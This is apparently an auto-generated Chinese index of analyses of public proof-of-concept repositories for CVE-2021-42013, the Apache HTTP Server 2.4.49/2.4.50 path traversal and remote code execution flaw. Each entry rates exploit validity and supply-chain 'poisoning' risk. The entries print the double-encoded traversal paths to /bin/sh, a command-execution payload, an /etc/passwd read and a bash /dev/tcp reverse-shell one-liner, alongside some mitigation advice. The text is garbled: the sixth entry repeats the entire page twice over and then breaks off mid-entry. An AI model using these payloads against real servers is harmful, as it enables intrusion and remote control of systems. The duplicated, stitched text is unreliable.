# CVE-2021-42013

> 📦 该CVE有 **20** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2021-42013-12345qwert123456_CVE-2021-42013.md](../2021/CVE-2021-42013-12345qwert123456_CVE-2021-42013.md)

## CVE-2021-42013 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-42013

**漏洞类型:** Path Traversal and Remote Code Execution

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感文件泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 服务器运行Apache HTTP Server 2.4.49或2.4.50，且存在Alias-like指令配置，CGI脚本已启用并且对Alias路径没有做`require all denied`限制。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-42013是CVE-2021-41773的不完整修复。攻击者可以利用路径遍历漏洞，将URL映射到Alias-like指令配置之外的文件。如果这些目录之外的文件没有受到默认配置"require all denied"的保护，则请求可能会成功。 如果还为这些别名路径启用了CGI脚本，则可能允许远程代码执行。

**漏洞利用方式：**

1.  **路径遍历：** 攻击者利用`..`序列绕过Alias-like指令的限制，访问受限目录之外的文件。
2.  **双URL编码：** 原始的CVE-2021-41773补丁未能正确处理双URL编码的路径。攻击者可以使用双URL编码（例如`%%32%65`代替`.`）来绕过补丁。
3.  **CGI执行：** 如果目标服务器启用了CGI，攻击者可以利用路径遍历访问到诸如`/bin/bash`等可执行文件，并执行任意命令。POC代码中通过POST请求向`/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/bash`发送payload `echo Content-Type: text/plain; echo; id`，该payload会通过bash执行id命令并返回结果。

**有效性：**

提供的POC代码有效，可以利用该漏洞在受影响的Apache HTTP Server版本上执行任意命令。

**投毒风险：**

Dockerfile修改了Apache的配置文件，启用了`mod_cgid`模块，并且将`Require denied`改为了`Require granted`。使得CGI脚本能够执行。作者有一定概率会进行投毒，但是从目前来看，作者只是为了让漏洞更容易复现，并没有发现明显的恶意代码。投毒风险评估为10%，主要是代码仓库所有者信誉未知，存在潜在风险。

**项目地址:** [12345qwert123456/CVE-2021-42013](https://github.com/12345qwert123456/CVE-2021-42013)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## POC #2

**来源**: [CVE-2021-42013-BassoNicolas_CVE-2021-42013.md](../2021/CVE-2021-42013-BassoNicolas_CVE-2021-42013.md)

## CVE-2021-42013 - Apache HTTP Server Path Traversal 和 RCE

**漏洞编号:** CVE-2021-42013

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，允许未经身份验证的远程攻击者读取任意文件和执行任意代码

**影响版本:** 2.4.49 和 2.4.50

**利用条件:** 目标服务器运行受影响的 Apache 版本，并且启用 cgi 脚本。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

根据漏洞库信息和搜索结果，CVE-2021-42013 是一个 Apache HTTP Server 中的路径遍历和远程代码执行漏洞。此漏洞是 CVE-2021-41773 的不完整修复。攻击者可以利用该漏洞，通过构造包含路径遍历序列（例如 `/.%%32%65`）的 URL，访问服务器上受限目录之外的文件。如果目标启用了 CGI 脚本，攻击者可以利用该漏洞执行任意代码。

**有效性：** 提供的 PoC 代码尝试利用该漏洞。它首先尝试提取目标 URL 的域名或 IP 地址，然后发送一个包含路径遍历序列的 POST 请求到 `/cgi-bin/` 目录，尝试执行指定的 RCE 命令。如果服务器返回 HTTP 状态码 200，则认为 Payload 执行成功，并打印返回结果，否则显示Payload执行失败。

**投毒风险：** 漏洞利用代码本身未发现明显的投毒代码。它执行的操作与漏洞描述一致，即尝试利用路径遍历漏洞执行命令。代码逻辑简单直接，没有发现恶意篡改或隐藏行为。因此，投毒风险评估为 0%。

**利用方式：**

1.  **确定目标：** 确定运行 Apache HTTP Server 2.4.49 或 2.4.50 的目标服务器。
2.  **检查配置：** 确认目标服务器是否启用了 CGI 脚本。
3.  **构造 Payload：** 使用包含路径遍历序列的 URL，例如 `/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh`，构造恶意请求。
4.  **发送请求：** 向目标服务器发送 POST 请求，其中包含构造的 URL 和要执行的命令。
5.  **分析结果：** 分析服务器的响应，判断命令是否执行成功。

**项目地址:** [BassoNicolas/CVE-2021-42013](https://github.com/BassoNicolas/CVE-2021-42013)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## POC #3

**来源**: [CVE-2021-42013-FakhriCRD_Apache-CVE-2021-42013-RCE-Exploit.md](../2021/CVE-2021-42013-FakhriCRD_Apache-CVE-2021-42013-RCE-Exploit.md)

## CVE-2021-42013 - Apache HTTP Server RCE

**漏洞编号:** CVE-2021-42013

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致完全系统入侵和控制

**影响版本:** 2.4.49, 2.4.50

**利用条件:** CGI脚本已启用，且 Alias 指令配置不当，未对外部文件进行 "require all denied" 保护。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-42013 是一个 Apache HTTP Server 中的远程代码执行漏洞。该漏洞是 CVE-2021-41773 的不完整修复。攻击者可以利用路径遍历漏洞读取服务器上的任意文件，如果服务器开启了 CGI 支持，则可能执行任意命令。

**有效性：**
提供的PoC 代码 `exploit.py` 利用 curl 发送带有特殊构造的 URL 的 POST 请求，尝试绕过路径限制并执行命令。URL 包含 `/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh`，其中 `%%32%65` 是 `%2e` 的双重 URL 编码，表示 `.` 字符。这种编码绕过了 Apache 的某些安全检查。如果目标服务器存在漏洞且 CGI 启用，则可以成功执行命令。

**利用方式：**
1.  **路径遍历：** 攻击者使用特制的 URL，其中包含双重编码的 `.` 字符，以绕过路径检查，访问受限目录之外的文件。
2.  **CGI 执行：** 如果服务器的 CGI 脚本已启用，攻击者可以通过访问 `cgi-bin` 目录下的脚本来执行代码。
3.  **命令执行：** 通过 POST 请求的 body 部分，将需要执行的命令传递给服务器。PoC 代码使用 `echo;{command}` 的方式，将命令注入到 shell 中执行。
4.  **反弹shell：** PoC代码可以自动生成反弹shell，从而建立与目标服务器的连接。

**投毒风险：**
该仓库中的投毒风险评估为 10%。虽然利用代码本身实现了漏洞利用的功能，但仍存在潜在的风险：

*   **不明显的恶意代码：** 作者可能在代码中插入不明显的恶意代码，例如收集目标服务器信息、植入后门等。
*   **依赖风险：**  虽然说明中声称没有额外的 Python 依赖，但是依然需要 curl 和 netcat 。curl 本身可能存在安全问题，如果 curl 被替换为恶意版本，可能导致额外的风险。
*   **供应链投毒：** 尽管该 PoC 没有明确的依赖关系，但 GitHub 仓库本身也可能受到供应链攻击的影响，例如账户被盗用并被恶意修改。

总而言之，在使用任何公开的漏洞利用代码时，都应谨慎审查代码，确保其安全性。建议在隔离环境中运行该 PoC 代码，并监控其行为，以防止潜在的恶意行为。

**项目地址:** [FakhriCRD/Apache-CVE-2021-42013-RCE-Exploit](https://github.com/FakhriCRD/Apache-CVE-2021-42013-RCE-Exploit)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## POC #4

**来源**: [CVE-2021-42013-Hamesawian_CVE-2021-42013.md](../2021/CVE-2021-42013-Hamesawian_CVE-2021-42013.md)

## CVE-2021-42013-Apache HTTP Server-路径遍历和远程代码执行

**漏洞编号:** CVE-2021-42013

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49和2.4.50

**利用条件:** 需要目标服务器运行受影响的Apache HTTP Server版本，且配置允许CGI脚本执行。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-42013是Apache HTTP Server 2.4.49和2.4.50版本中存在的路径遍历漏洞，是CVE-2021-41773的不完整修复。

**有效性分析：**
根据漏洞信息和搜索结果，此漏洞允许攻击者利用路径遍历攻击，将URL映射到Alias指令配置目录之外的文件。如果这些目录之外的文件没有受到“require all denied”的默认配置保护，请求可能会成功。如果CGI脚本对这些别名路径也启用，可能导致远程代码执行。
提供的POC代码使用`curl`命令尝试通过路径遍历读取`/etc/passwd`文件。攻击者通过`cgi-bin`目录，使用编码后的`../`来尝试访问`/etc/passwd`，验证是否存在路径遍历漏洞。

**投毒风险分析：**
查看漏洞利用代码仓库，其中包含用于测试漏洞的curl命令，以及一个README文件，描述了漏洞和版本。并没有发现任何恶意代码，因此投毒风险为0%。

**利用方式：**
1.  **路径遍历：** 攻击者构造包含编码后的路径遍历字符（如`%32%65`代表`.`）的URL，尝试访问受限目录之外的文件。
2.  **条件：** 成功利用的前提是：
    *   目标服务器运行Apache HTTP Server 2.4.49或2.4.50。
    *   受影响的文件没有被`require all denied`配置保护。
    *   CGI脚本已启用。
3.  **远程代码执行（如果满足CGI条件）：** 如果CGI脚本已启用，攻击者可以通过上传恶意CGI脚本并执行，从而实现远程代码执行。

**总结：** 此漏洞的利用依赖于服务器配置。 如果`/etc/passwd`可以读取，代表着高危漏洞利用的开始,可以进行进一步利用,如果CGI可用，那么将可以达成远程代码执行。

**项目地址:** [Hamesawian/CVE-2021-42013](https://github.com/Hamesawian/CVE-2021-42013)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## POC #5

**来源**: [CVE-2021-42013-K3ysTr0K3R_CVE-2021-42013-EXPLOIT.md](../2021/CVE-2021-42013-K3ysTr0K3R_CVE-2021-42013-EXPLOIT.md)

## CVE-2021-42013 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-42013

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 目标服务器运行受影响的 Apache 版本，且允许 CGI 脚本执行，Alias-like directives配置不当。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-42013 是一个存在于 Apache HTTP Server 2.4.49 和 2.4.50 版本中的路径遍历和远程代码执行漏洞。该漏洞是 CVE-2021-41773 的不完整修复。攻击者可以利用该漏洞通过构造恶意的 URL，绕过 Alias-like 指令的限制，访问服务器上受限制的文件。如果目标服务器配置允许 CGI 脚本执行，攻击者可以通过路径遍历执行任意代码。 

**有效性：** 提供的 Python 脚本 `CVE-2021-42013.py` 看起来有效，因为它实现了漏洞的利用过程。

该脚本首先尝试测试目标是否易受攻击，然后利用该漏洞通过 curl 命令发送一个 reverse shell payload。它还在本地启动一个监听器来接收 shell 连接。脚本中使用了 `subprocess.check_output` 执行 curl 命令，并使用线程来同时运行漏洞利用和监听器。

**投毒风险：**

分析提供的代码，存在一些小的投毒风险:

1.  **硬编码的路径:** 脚本中使用了硬编码的 `/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh` 路径。虽然这是漏洞利用的一部分，但如果攻击者修改此路径，可能会导致脚本在非预期目标上执行。
2.  **Reverse Shell Payload:** 使用了 `bash -c '0<&124-;exec 124<>/dev/tcp/{lhost}/{lport};sh <&124 >&124 2>&124'` 作为反向 shell payload。这个 payload 相对常见，但如果攻击者修改此 payload，可能会执行恶意命令，例如下载并执行其他恶意软件。
3.  **User-Agent:**  使用了特定的User-Agent字符串，这可能被用于识别和阻止攻击。攻击者可能会修改 User-Agent 来绕过检测。
4.  **端口硬编码:** 监听端口硬编码为4444,如果目标网络存在端口过滤,或者其他服务占用了4444端口,可能会利用失败,攻击者可能修改端口来绕过防御.

**利用方式：**

1.  **路径遍历:** 攻击者构造包含 `/.%%32%65/.%%32%65` 序列的恶意 URL，绕过 Apache 的路径规范化，从而访问位于 Alias-like 指令配置目录之外的文件。
2.  **CGI 执行:** 如果目标服务器的 `/cgi-bin/` 目录配置为允许执行 CGI 脚本，攻击者可以通过路径遍历访问 `sh` 或其他 shell 解释器。
3.  **远程代码执行:** 攻击者通过构造特定的请求，利用 `sh` 解释器执行任意 shell 命令。通常，攻击者会执行反向 shell 命令，从而在攻击者控制的机器上获得 shell 访问权限。

**缓解措施：**

*   升级到不受漏洞影响的 Apache HTTP Server 版本 (>= 2.4.51)。
*   禁用 CGI 脚本执行，除非绝对必要。
*   配置 Alias-like 指令时，确保使用 `Require all denied` 或其他适当的访问控制，限制对配置目录之外的文件的访问。
*   使用 Web 应用防火墙 (WAF) 检测和阻止包含路径遍历序列的恶意请求。


**项目地址:** [K3ysTr0K3R/CVE-2021-42013-EXPLOIT](https://github.com/K3ysTr0K3R/CVE-2021-42013-EXPLOIT)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## POC #6

**来源**: [CVE-2021-42013-Makavellik_POC-CVE-2021-42013-EXPLOIT.md](../2021/CVE-2021-42013-Makavellik_POC-CVE-2021-42013-EXPLOIT.md)

# CVE-2021-42013

> 📦 该CVE有 **20** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2021-42013-12345qwert123456_CVE-2021-42013.md](../2021/CVE-2021-42013-12345qwert123456_CVE-2021-42013.md)

## CVE-2021-42013 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-42013

**漏洞类型:** Path Traversal and Remote Code Execution

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感文件泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 服务器运行Apache HTTP Server 2.4.49或2.4.50，且存在Alias-like指令配置，CGI脚本已启用并且对Alias路径没有做`require all denied`限制。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-42013是CVE-2021-41773的不完整修复。攻击者可以利用路径遍历漏洞，将URL映射到Alias-like指令配置之外的文件。如果这些目录之外的文件没有受到默认配置"require all denied"的保护，则请求可能会成功。 如果还为这些别名路径启用了CGI脚本，则可能允许远程代码执行。

**漏洞利用方式：**

1.  **路径遍历：** 攻击者利用`..`序列绕过Alias-like指令的限制，访问受限目录之外的文件。
2.  **双URL编码：** 原始的CVE-2021-41773补丁未能正确处理双URL编码的路径。攻击者可以使用双URL编码（例如`%%32%65`代替`.`）来绕过补丁。
3.  **CGI执行：** 如果目标服务器启用了CGI，攻击者可以利用路径遍历访问到诸如`/bin/bash`等可执行文件，并执行任意命令。POC代码中通过POST请求向`/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/bash`发送payload `echo Content-Type: text/plain; echo; id`，该payload会通过bash执行id命令并返回结果。

**有效性：**

提供的POC代码有效，可以利用该漏洞在受影响的Apache HTTP Server版本上执行任意命令。

**投毒风险：**

Dockerfile修改了Apache的配置文件，启用了`mod_cgid`模块，并且将`Require denied`改为了`Require granted`。使得CGI脚本能够执行。作者有一定概率会进行投毒，但是从目前来看，作者只是为了让漏洞更容易复现，并没有发现明显的恶意代码。投毒风险评估为10%，主要是代码仓库所有者信誉未知，存在潜在风险。

**项目地址:** [12345qwert123456/CVE-2021-42013](https://github.com/12345qwert123456/CVE-2021-42013)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## POC #2

**来源**: [CVE-2021-42013-BassoNicolas_CVE-2021-42013.md](../2021/CVE-2021-42013-BassoNicolas_CVE-2021-42013.md)

## CVE-2021-42013 - Apache HTTP Server Path Traversal 和 RCE

**漏洞编号:** CVE-2021-42013

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，允许未经身份验证的远程攻击者读取任意文件和执行任意代码

**影响版本:** 2.4.49 和 2.4.50

**利用条件:** 目标服务器运行受影响的 Apache 版本，并且启用 cgi 脚本。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

根据漏洞库信息和搜索结果，CVE-2021-42013 是一个 Apache HTTP Server 中的路径遍历和远程代码执行漏洞。此漏洞是 CVE-2021-41773 的不完整修复。攻击者可以利用该漏洞，通过构造包含路径遍历序列（例如 `/.%%32%65`）的 URL，访问服务器上受限目录之外的文件。如果目标启用了 CGI 脚本，攻击者可以利用该漏洞执行任意代码。

**有效性：** 提供的 PoC 代码尝试利用该漏洞。它首先尝试提取目标 URL 的域名或 IP 地址，然后发送一个包含路径遍历序列的 POST 请求到 `/cgi-bin/` 目录，尝试执行指定的 RCE 命令。如果服务器返回 HTTP 状态码 200，则认为 Payload 执行成功，并打印返回结果，否则显示Payload执行失败。

**投毒风险：** 漏洞利用代码本身未发现明显的投毒代码。它执行的操作与漏洞描述一致，即尝试利用路径遍历漏洞执行命令。代码逻辑简单直接，没有发现恶意篡改或隐藏行为。因此，投毒风险评估为 0%。

**利用方式：**

1.  **确定目标：** 确定运行 Apache HTTP Server 2.4.49 或 2.4.50 的目标服务器。
2.  **检查配置：** 确认目标服务器是否启用了 CGI 脚本。
3.  **构造 Payload：** 使用包含路径遍历序列的 URL，例如 `/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh`，构造恶意请求。
4.  **发送请求：** 向目标服务器发送 POST 请求，其中包含构造的 URL 和要执行的命令。
5.  **分析结果：** 分析服务器的响应，判断命令是否执行成功。

**项目地址:** [BassoNicolas/CVE-2021-42013](https://github.com/BassoNicolas/CVE-2021-42013)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## POC #3

**来源**: [CVE-2021-42013-FakhriCRD_Apache-CVE-2021-42013-RCE-Exploit.md](../2021/CVE-2021-42013-FakhriCRD_Apache-CVE-2021-42013-RCE-Exploit.md)

## CVE-2021-42013 - Apache HTTP Server RCE

**漏洞编号:** CVE-2021-42013

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致完全系统入侵和控制

**影响版本:** 2.4.49, 2.4.50

**利用条件:** CGI脚本已启用，且 Alias 指令配置不当，未对外部文件进行 "require all denied" 保护。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-42013 是一个 Apache HTTP Server 中的远程代码执行漏洞。该漏洞是 CVE-2021-41773 的不完整修复。攻击者可以利用路径遍历漏洞读取服务器上的任意文件，如果服务器开启了 CGI 支持，则可能执行任意命令。

**有效性：**
提供的PoC 代码 `exploit.py` 利用 curl 发送带有特殊构造的 URL 的 POST 请求，尝试绕过路径限制并执行命令。URL 包含 `/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh`，其中 `%%32%65` 是 `%2e` 的双重 URL 编码，表示 `.` 字符。这种编码绕过了 Apache 的某些安全检查。如果目标服务器存在漏洞且 CGI 启用，则可以成功执行命令。

**利用方式：**
1.  **路径遍历：** 攻击者使用特制的 URL，其中包含双重编码的 `.` 字符，以绕过路径检查，访问受限目录之外的文件。
2.  **CGI 执行：** 如果服务器的 CGI 脚本已启用，攻击者可以通过访问 `cgi-bin` 目录下的脚本来执行代码。
3.  **命令执行：** 通过 POST 请求的 body 部分，将需要执行的命令传递给服务器。PoC 代码使用 `echo;{command}` 的方式，将命令注入到 shell 中执行。
4.  **反弹shell：** PoC代码可以自动生成反弹shell，从而建立与目标服务器的连接。

**投毒风险：**
该仓库中的投毒风险评估为 10%。虽然利用代码本身实现了漏洞利用的功能，但仍存在潜在的风险：

*   **不明显的恶意代码：** 作者可能在代码中插入不明显的恶意代码，例如收集目标服务器信息、植入后门等。
*   **依赖风险：**  虽然说明中声称没有额外的 Python 依赖，但是依然需要 curl 和 netcat 。curl 本身可能存在安全问题，如果 curl 被替换为恶意版本，可能导致额外的风险。
*   **供应链投毒：** 尽管该 PoC 没有明确的依赖关系，但 GitHub 仓库本身也可能受到供应链攻击的影响，例如账户被盗用并被恶意修改。

总而言之，在使用任何公开的漏洞利用代码时，都应谨慎审查代码，确保其安全性。建议在隔离环境中运行该 PoC 代码，并监控其行为，以防止潜在的恶意行为。

**项目地址:** [FakhriCRD/Apache-CVE-2021-42013-RCE-Exploit](https://github.com/FakhriCRD/Apache-CVE-2021-42013-RCE-Exploit)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## POC #4

**来源**: [CVE-2021-42013-Hamesawian_CVE-2021-42013.md](../2021/CVE-2021-42013-Hamesawian_CVE-2021-42013.md)

## CVE-2021-42013-Apache HTTP Server-路径遍历和远程代码执行

**漏洞编号:** CVE-2021-42013

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49和2.4.50

**利用条件:** 需要目标服务器运行受影响的Apache HTTP Server版本，且配置允许CGI脚本执行。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-42013是Apache HTTP Server 2.4.49和2.4.50版本中存在的路径遍历漏洞，是CVE-2021-41773的不完整修复。

**有效性分析：**
根据漏洞信息和搜索结果，此漏洞允许攻击者利用路径遍历攻击，将URL映射到Alias指令配置目录之外的文件。如果这些目录之外的文件没有受到“require all denied”的默认配置保护，请求可能会成功。如果CGI脚本对这些别名路径也启用，可能导致远程代码执行。
提供的POC代码使用`curl`命令尝试通过路径遍历读取`/etc/passwd`文件。攻击者通过`cgi-bin`目录，使用编码后的`../`来尝试访问`/etc/passwd`，验证是否存在路径遍历漏洞。

**投毒风险分析：**
查看漏洞利用代码仓库，其中包含用于测试漏洞的curl命令，以及一个README文件，描述了漏洞和版本。并没有发现任何恶意代码，因此投毒风险为0%。

**利用方式：**
1.  **路径遍历：** 攻击者构造包含编码后的路径遍历字符（如`%32%65`代表`.`）的URL，尝试访问受限目录之外的文件。
2.  **条件：** 成功利用的前提是：
    *   目标服务器运行Apache HTTP Server 2.4.49或2.4.50。
    *   受影响的文件没有被`require all denied`配置保护。
    *   CGI脚本已启用。
3.  **远程代码执行（如果满足CGI条件）：** 如果CGI脚本已启用，攻击者可以通过上传恶意CGI脚本并执行，从而实现远程代码执行。

**总结：** 此漏洞的利用依赖于服务器配置。 如果`/etc/passwd`可以读取，代表着高危漏洞利用的开始,可以进行进一步利用,如果CGI可用，那么将可以达成远程代码执行。

**项目地址:** [Hamesawian/CVE-2021-42013](https://github.com/Hamesawian/CVE-2021-42013)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## POC #5

**来源**: [CVE-2021-42013-K3ysTr0K3R_CVE-2021-42013-EXPLOIT.md](../2021/CVE-2021-42013-K3ysTr0K3R_CVE-2021-42013-EXPLOIT.md)

## CVE-2021-42013 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-42013

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 目标服务器运行受影响的 Apache 版本，且允许 CGI 脚本执行，Alias-like directives配置不当。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-42013 是一个存在于 Apache HTTP Server 2.4.49 和 2.4.50 版本中的路径遍历和远程代码执行漏洞。该漏洞是 CVE-2021-41773 的不完整修复。攻击者可以利用该漏洞通过构造恶意的 URL，绕过 Alias-like 指令的限制，访问服务器上受限制的文件。如果目标服务器配置允许 CGI 脚本执行，攻击者可以通过路径遍历执行任意代码。 

**有效性：** 提供的 Python 脚本 `CVE-2021-42013.py` 看起来有效，因为它实现了漏洞的利用过程。

该脚本首先尝试测试目标是否易受攻击，然后利用该漏洞通过 curl 命令发送一个 reverse shell payload。它还在本地启动一个监听器来接收 shell 连接。脚本中使用了 `subprocess.check_output` 执行 curl 命令，并使用线程来同时运行漏洞利用和监听器。

**投毒风险：**

分析提供的代码，存在一些小的投毒风险:

1.  **硬编码的路径:** 脚本中使用了硬编码的 `/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh` 路径。虽然这是漏洞利用的一部分，但如果攻击者修改此路径，可能会导致脚本在非预期目标上执行。
2.  **Reverse Shell Payload:** 使用了 `bash -c '0<&124-;exec 124<>/dev/tcp/{lhost}/{lport};sh <&124 >&124 2>&124'` 作为反向 shell payload。这个 payload 相对常见，但如果攻击者修改此 payload，可能会执行恶意命令，例如下载并执行其他恶意软件。
3.  **User-Agent:**  使用了特定的User-Agent字符串，这可能被用于识别和阻止攻击。攻击者可能会修改 User-Agent 来绕过检测。
4.  **端口硬编码:** 监听端口硬编码为4444,如果目标网络存在端口过滤,或者其他服务占用了4444端口,可能会利用失败,攻击者可能修改端口来绕过防御.

**利用方式：**

1.  **路径遍历:** 攻击者构造包含 `/.%%32%65/.%%32%65` 序列的恶意 URL，绕过 Apache 的路径规范化，从而访问位于 Alias-like 指令配置目录之外的文件。
2.  **CGI 执行:** 如果目标服务器的 `/cgi-bin/` 目录配置为允许执行 CGI 脚本，攻击者可以通过路径遍历访问 `sh` 或其他 shell 解释器。
3.  **远程代码执行:** 攻击者通过构造特定的请求，利用 `sh` 解释器执行任意 shell 命令。通常，攻击者会执行反向 shell 命令，从而在攻击者控制的机器上获得 shell 访问权限。

**缓解措施：**

*   升级到不受漏洞影响的 Apache HTTP Server 版本 (>= 2.4.51)。
*   禁用 CGI 脚本执行，除非绝对必要。
*   配置 Alias-like 指令时，确保使用 `Require all denied` 或其他适当的访问控制，限制对配置目录之外的文件的访问。
*   使用 Web 应用防火墙 (WAF) 检测和阻止包含路径遍历序列的恶意请求。


**项目地址:** [K3ysTr0K3R/CVE-2021-42013-EXPLOIT](https://github.com/K3ysTr0K3R/CVE-2021-42013-EXPLOIT)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## POC #6

**来源**: [CVE-2021-42013-Makavellik_POC-CVE-2021-42013-EXPLOIT.md](../2021/CVE-2021-42013-Makavellik_POC-CVE-2021-42013-EXPLOIT.md)

# CVE-2021-42013

> 📦 该CVE有 **20** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2021-42013-12345qwert123456_CVE-2021-42013.md](../2021/CVE-2021-42013-12345qwert123456_CVE-2021-42013.md)

## CVE-2021-42013 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-42013

**漏洞类型:** Path Traversal and Remote Code Execution

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感文件泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 服务器运行Apache HTTP Server 2.4.49或2.4.50，且存在Alias-like指令配置，CGI脚本已启用并且对Alias路径没有做`require all denied`限制。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-42013是CVE-2021-41773的不完整修复。攻击者可以利用路径遍历漏洞，将URL映射到Alias-like指令配置之外的文件。如果这些目录之外的文件没有受到默认配置"require all denied"的保护，则请求可能会成功。 如果还为这些别名路径启用了CGI脚本，则可能允许远程代码执行。

**漏洞利用方式：**

1.  **路径遍历：** 攻击者利用`..`序列绕过Alias-like指令的限制，访问受限目录之外的文件。
2.  **双URL编码：** 原始的CVE-2021-41773补丁未能正确处理双URL编码的路径。攻击者可以使用双URL编码（例如`%%32%65`代替`.`）来绕过补丁。
3.  **CGI执行：** 如果目标服务器启用了CGI，攻击者可以利用路径遍历访问到诸如`/bin/bash`等可执行文件，并执行任意命令。POC代码中通过POST请求向`/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/bash`发送payload `echo Content-Type: text/plain; echo; id`，该payload会通过bash执行id命令并返回结果。

**有效性：**

提供的POC代码有效，可以利用该漏洞在受影响的Apache HTTP Server版本上执行任意命令。

**投毒风险：**

Dockerfile修改了Apache的配置文件，启用了`mod_cgid`模块，并且将`Require denied`改为了`Require granted`。使得CGI脚本能够执行。作者有一定概率会进行投毒，但是从目前来看，作者只是为了让漏洞更容易复现，并没有发现明显的恶意代码。投毒风险评估为10%，主要是代码仓库所有者信誉未知，存在潜在风险。

**项目地址:** [12345qwert123456/CVE-2021-42013](https://github.com/12345qwert123456/CVE-2021-42013)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## POC #2

**来源**: [CVE-2021-42013-BassoNicolas_CVE-2021-42013.md](../2021/CVE-2021-42013-BassoNicolas_CVE-2021-42013.md)

## CVE-2021-42013 - Apache HTTP Server Path Traversal 和 RCE

**漏洞编号:** CVE-2021-42013

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，允许未经身份验证的远程攻击者读取任意文件和执行任意代码

**影响版本:** 2.4.49 和 2.4.50

**利用条件:** 目标服务器运行受影响的 Apache 版本，并且启用 cgi 脚本。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

根据漏洞库信息和搜索结果，CVE-2021-42013 是一个 Apache HTTP Server 中的路径遍历和远程代码执行漏洞。此漏洞是 CVE-2021-41773 的不完整修复。攻击者可以利用该漏洞，通过构造包含路径遍历序列（例如 `/.%%32%65`）的 URL，访问服务器上受限目录之外的文件。如果目标启用了 CGI 脚本，攻击者可以利用该漏洞执行任意代码。

**有效性：** 提供的 PoC 代码尝试利用该漏洞。它首先尝试提取目标 URL 的域名或 IP 地址，然后发送一个包含路径遍历序列的 POST 请求到 `/cgi-bin/` 目录，尝试执行指定的 RCE 命令。如果服务器返回 HTTP 状态码 200，则认为 Payload 执行成功，并打印返回结果，否则显示Payload执行失败。

